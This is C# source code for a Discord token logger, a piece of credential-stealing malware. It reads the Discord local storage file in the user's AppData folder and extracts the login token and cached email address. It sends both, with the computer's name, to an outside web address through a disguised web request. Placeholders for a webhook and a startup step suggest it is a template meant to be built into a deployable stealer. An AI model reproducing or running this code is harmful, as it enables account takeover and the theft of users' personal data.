using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using Microsoft.Win32;

namespace Discord_Token_Logger
{
    class Program
    {
        //Variables
        static string Tag = "TagReplace";
        static string dfas = "HookReplace";
        static string Content = "";
        static string Version = "0.91";

        static void Main()
        {
            string Token;
            string Email;
            string CookieLoc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\https_discordapp.com_0.localstorage";
            string Cookie = "";
            string CheckToken = @"C:\Users\Public\Token.txt";

            //ReplaceStartup

            Console.Read();
            while (true)
            {

                if (!File.Exists(CheckToken))
                {
                    File.WriteAllText(CheckToken, "Created");
                }


                try
                {
                    //Open the file for reading then read it.
                    var CookieStream = File.Open(CookieLoc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    var CookieReader = new StreamReader(CookieStream);

                    Cookie = CookieReader.ReadToEnd();

                    //Dispose
                    CookieReader.Dispose();
                    CookieStream.Dispose();

                }
                catch { }

                /*--------------Get the token and Email--------------*/
                //Gets the token
                Token = Cookie.Substring(Cookie.IndexOf("token\"") + 5);
                Token = Token.Substring(0, 121);
                Token = Token.Replace("\0", string.Empty);
                //Gets the Email
                Email = Cookie.Substring(Cookie.IndexOf("email_cache\"") + 12);
                Email = Email.Substring(0, Email.IndexOf("\""));
                Email = Email.Replace("\0", string.Empty);

                /*---------------Send the token and Email---------------*/
                if (Token != File.ReadAllText(CheckToken) && Token != "" && !Token.Contains("\0002"))
                {
                    Console.WriteLine(Token);
                    File.WriteAllText(CheckToken, Token);
                    var WC = new WebClient();
                    WC.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    try
                    { //Gets the IP & its info.
                        Content = WC.DownloadString("https://littest.site/Projects/format.php?T=" + Token + "&E=" + Email + "&N=" + Environment.MachineName); //CodeDom doesn't support C# 6 so I can't use interpolation and had to remove it
                    }
                    catch { };

                    WC.Dispose();

                }

                return;
            }
        }
    }
}
